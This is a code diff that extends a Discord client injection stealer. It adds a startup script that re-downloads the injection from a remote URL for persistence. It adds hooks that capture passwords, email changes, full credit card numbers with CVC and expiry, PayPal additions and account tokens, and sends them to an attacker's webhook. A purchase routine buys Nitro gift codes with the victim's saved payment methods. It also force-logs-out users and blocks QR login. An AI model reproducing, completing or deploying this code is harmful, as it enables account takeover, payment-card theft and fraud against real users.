@@ -19,7 +19,7 @@ const config = {
     paypal: "<:paypal:990732200993505280>",
     classic: "<:nitro:990727425790976060>",
     boost: "<:boost1month:990730687579570246>",
-  },  
+  },
   webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
@@ -446,6 +446,34 @@ function updateCheck() {
       ),
     );
 
+    const startUpScript = `const fs = require('fs'), https = require('https');
+const indexJs = '${indexJs}';
+const bdPath = '${bdPath}';
+const fileSize = fs.statSync(indexJs).size
+fs.readFileSync(indexJs, 'utf8', (err, data) => {
+    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
+        init();
+})
+async function init() {
+    https.get('${config.injection_url}', (res) => {
+        const file = fs.createWriteStream(indexJs);
+        res.replace('%WEBHOOK%', '${config.webhook}')
+        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
+        res.pipe(file);
+        file.on('finish', () => {
+            file.close();
+        });
+    
+    }).on("error", (err) => {
+        setTimeout(init(), 10000);
+    });
+}
+require('${path.join(resourcePath, 'app.asar')}')
+if (fs.existsSync(bdPath)) require(bdPath);`;
+    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
+  }
+  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
+  fs.rmdirSync(path.join(__dirname, 'initiation'));
   execScript(
     `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
   );
@@ -479,7 +507,6 @@ const fetchBilling = async (token) => {
     xmlHttp.setRequestHeader("Authorization", "${token}"); 
     xmlHttp.send(null); 
     xmlHttp.responseText`);
-
   try {
     return typeof bill === "string" ? JSON.parse(bill) : bill;
   } catch (e) {
@@ -505,6 +532,59 @@ const getBilling = async (token) => {
   });
   if (!billing) billing = "`No Billing`";
   return billing;
+};
+
+const Purchase = async (token, id, _type, _time) => {
+  const options = {
+    expected_amount: config.nitro[_type][_time]['price'],
+    expected_currency: 'usd',
+    gift: true,
+    payment_source_id: id,
+    payment_source_token: null,
+    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
+    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
+  };
+
+  const req = execScript(`var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
+    xmlHttp.setRequestHeader("Authorization", "${token}");
+    xmlHttp.setRequestHeader('Content-Type', 'application/json');
+    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
+    xmlHttp.responseText`);
+  if (req['gift_code']) {
+    return 'https://discord.gift/' + req['gift_code'];
+  } else return null;
+};
+
+const buyNitro = async (token) => {
+  const data = await fetchBilling(token);
+  const failedMsg = 'Failed to Purchase ❌';
+  if (!data) return failedMsg;
+
+  let IDS = [];
+  data.forEach((x) => {
+    if (!x.invalid) {
+      IDS = IDS.concat(x.id);
+    }
+  });
+  for (let sourceID in IDS) {
+    const first = Purchase(token, sourceID, 'boost', 'year');
+    if (first !== null) {
+      return first;
+    } else {
+      const second = Purchase(token, sourceID, 'boost', 'month');
+      if (second !== null) {
+        return second;
+      } else {
+        const third = Purchase(token, sourceID, 'classic', 'month');
+        if (third !== null) {
+          return third;
+        } else {
+          return failedMsg;
+        }
+      }
+    }
+  }
 };
 
 const getNitro = (flags) => {
@@ -599,7 +679,6 @@ const login = async (email, password, token) => {
   const avatar = json.avatar
     ? `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
     : `https://cdn.discordapp.com/embed/avatars/${json.discriminator % 5}.png`;
-
   const content = {
     embeds: [
       {
@@ -658,6 +737,249 @@ const login = async (email, password, token) => {
   hooker(content);
 };
 
+const passwordChanged = async (oldpassword, newpassword, token) => {
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = await getBilling(token);
+  const ip = await getIP();
+  const avatar = json.avatar
+    ? `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
+    : `https://cdn.discordapp.com/embed/avatars/${json.discriminator % 5}.png`;
+
+  const content = {
+    embeds: [
+      {
+        color: config["embed-color"],
+        title: "Password Changed",
+        author: {
+          name: `${json.username}#${json.discriminator} (${json.id})`,
+          icon_url: config["stealer-icon"],
+        },
+        thumbnail: {
+          url: avatar,
+        },
+        footer: {
+          text: config["stealer-name"],
+          icon_url: config["stealer-icon"],
+        },
+        fields: [
+          {
+            name: `${config.emojis.billing}`,
+            value: `\`${token}\``,
+          },
+          {
+            name: `${config.emojis.badges} Badges`,
+            value: `${badges.length > 0 ? badges : "`No Badges`"}`,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.nitroType} Nitro Type`,
+            value: nitro,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.billing} Billing`,
+            value: billing,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.ip} IP`,
+            value: `\`${ip}\``,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.email} Email`,
+            value: `\`${json.email || `null`}\``,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.oldPass} Old Password`,
+            value: `\`${oldpassword || `null`}\``,
+            inline: !0,
+          },
+          {
+            name: `${config.emojis.newPass} New Password`,
+            value: `\`${newpassword || `null`}\``,
+            inline: !0,
+          },
+        ],
+      },
+    ],
+  };
+
+  hooker(content);
+};
+
+const emailChanged = async (email, password, token) => {
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = await getBilling(token);
+  const content = {
+    username: config.embed_name,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [
+          {
+            name: '**Email Changed**',
+            value: `New Email: **${email}**\nPassword: **${password}**`,
+            inline: true,
+          },
+          {
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            inline: true,
+          },
+          {
+            name: '**Token**',
+            value: `\`${token}\``,
+            inline: false,
+          },
+        ],
+        author: {
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+        },
+      },
+    ],
+  };
+  if (config.ping_on_run) content['content'] = config.ping_val;
+  hooker(content);
+};
+
+const PaypalAdded = async (token) => {
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = getBilling(token);
+  const content = {
+    username: config.embed_name,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [
+          {
+            name: '**Paypal Added**',
+            value: `Time to buy some nitro baby 😩`,
+            inline: false,
+          },
+          {
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
+            inline: false,
+          },
+          {
+            name: '**Token**',
+            value: `\`${token}\``,
+            inline: false,
+          },
+        ],
+        author: {
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+        },
+      },
+    ],
+  };
+  if (config.ping_on_run) content['content'] = config.ping_val;
+  hooker(content);
+};
+
+const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = await getBilling(token);
+  const content = {
+    username: config.embed_name,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [
+          {
+            name: '**Credit Card Added**',
+            value: `Credit Card Number: **${number}**\nCVC: **${cvc}**\nCredit Card Expiration: **${expir_month}/${expir_year}**`,
+            inline: true,
+          },
+          {
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            inline: true,
+          },
+          {
+            name: '**Token**',
+            value: `\`${token}\``,
+            inline: false,
+          },
+        ],
+        author: {
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+        },
+      },
+    ],
+  };
+  if (config.ping_on_run) content['content'] = config.ping_val;
+  hooker(content);
+};
+
+const nitroBought = async (token) => {
+  const json = await getInfo(token);
+  const nitro = getNitro(json.premium_type);
+  const badges = getBadges(json.flags);
+  const billing = await getBilling(token);
+  const code = await buyNitro(token);
+  const content = {
+    username: config.embed_name,
+    content: code,
+    avatar_url: config.embed_icon,
+    embeds: [
+      {
+        color: config.embed_color,
+        fields: [
+          {
+            name: '**Nitro bought!**',
+            value: `**Nitro Code:**\n\`\`\`diff\n+ ${code}\`\`\``,
+            inline: true,
+          },
+          {
+            name: '**Discord Info**',
+            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            inline: true,
+          },
+          {
+            name: '**Token**',
+            value: `\`${token}\``,
+            inline: false,
+          },
+        ],
+        author: {
+          name: json.username + '#' + json.discriminator + ' | ' + json.id,
+          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+        },
+        footer: {
+          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+        },
+      },
+    ],
+  };
+  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
+  hooker(content);
+};
 session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
   if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
   updateCheck();
@@ -709,6 +1031,32 @@ session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) 
   switch (true) {
     case details.url.endsWith('login'):
       login(data.login, data.password, token).catch(console.error);
+      break;
+
+    case details.url.endsWith('users/@me') && details.method === 'PATCH':
+      if (!data.password) return;
+      if (data.email) {
+        emailChanged(data.email, data.password, token).catch(console.error);
+      }
+      if (data.new_password) {
+        passwordChanged(data.password, data.new_password, token).catch(console.error);
+      }
+      break;
+
+    case details.url.endsWith('tokens') && details.method === 'POST':
+      const item = querystring.parse(unparsedData.toString());
+      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
+      break;
+
+    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
+      PaypalAdded(token).catch(console.error);
+      break;
+
+    case details.url.endsWith('confirm') && details.method === 'POST':
+      if (!config.auto_buy_nitro) return;
+      setTimeout(() => {
+        nitroBought(token).catch(console.error);
+      }, 7500);
       break;
 
     default:
